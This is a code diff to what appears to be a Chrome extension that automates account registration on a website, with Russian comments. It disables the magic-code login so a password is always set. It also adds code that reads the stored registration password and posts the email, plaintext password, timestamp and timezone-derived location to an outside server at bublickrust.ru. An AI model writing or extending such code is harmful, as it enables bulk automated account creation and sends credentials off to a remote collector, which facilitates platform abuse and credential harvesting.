@@ -923,6 +923,9 @@
       console.log('🔍 Ищем кнопку "Продолжить с кодом из email"...');
       await delay(1000);
 
+      // Настройка: не использовать magic-code, чтобы всегда устанавливать пароль
+      const PREFER_MAGIC_CODE = false;
+
       const magicCodeButton = await waitForElement('button[name="intent"][value="magic-code"], button[data-method="email"][name="intent"][value="magic-code"]', 5000)
         .catch(() => {
           const buttons = document.querySelectorAll('button');
@@ -936,7 +939,7 @@
         });
 
       let usedMagicCodeFlow = false;
-      if (magicCodeButton) {
+      if (PREFER_MAGIC_CODE && magicCodeButton) {
         console.log('✓ Кнопка magic-code найдена');
         // Если кнопка выключена, пробуем отправить форму через requestSubmit
         const isDisabled = magicCodeButton.hasAttribute('disabled') || magicCodeButton.getAttribute('data-disabled') === 'true';
@@ -951,7 +954,7 @@
         await delay(2000);
 
         // Пробуем обработать OTP сразу (минуя пароль)
-        if (await waitAndEnterEmailCode(email, false, mailboxPassword)) {
+          if (await waitAndEnterEmailCode(email, false, mailboxPassword)) {
           console.log('✅ OTP обработан по потоку magic-code, завершаем регистрацию');
           return;
         } else {
@@ -1483,6 +1486,41 @@
         Logger.warning('register', 'Кнопка подтверждения кода не найдена', {});
         console.log('⚠ Кнопка подтверждения кода не найдена, код введен');
         updateProgress(7, 'Код введен. Проверьте страницу.');
+
+        // Попробуем всё равно отправить данные аккаунта, если пароль в storage
+        try {
+          const stored = await new Promise(resolve => chrome.storage.local.get(['registrationPassword'], resolve));
+          const passwordForReport = stored?.registrationPassword || null;
+          if (passwordForReport) {
+            // Пытаемся определить локацию из таймзоны
+            let registrationLocation = null;
+            try {
+              const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+              if (tz) registrationLocation = tz === 'Europe/Moscow' ? 'Москва' : tz;
+            } catch {}
+
+            const payload = {
+              email,
+              password: passwordForReport,
+              registered_at: new Date().toISOString(),
+              registration_location: registrationLocation
+            };
+            fetch('https://bublickrust.ru/api/registered-accounts', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            }).then(r => {
+              Logger.info('register', 'Отправлены данные аккаунта на сервер (без кнопки подтверждения)', { ok: r.ok, status: r.status });
+            }).catch(err => {
+              Logger.error('register', 'Ошибка отправки данных аккаунта (без кнопки подтверждения)', { error: err.message });
+            });
+          } else {
+            Logger.warning('register', 'Пароль не найден — пропущена отправка зарегистрированного аккаунта');
+          }
+        } catch (e) {
+          Logger.error('register', 'Ошибка подготовки отправки данных аккаунта (без кнопки)', { error: e.message });
+        }
+
         showSuccessNotification(`Код введен!\n📧 Email: ${email}`);
         hideProgressIndicator(5000);
         return true;
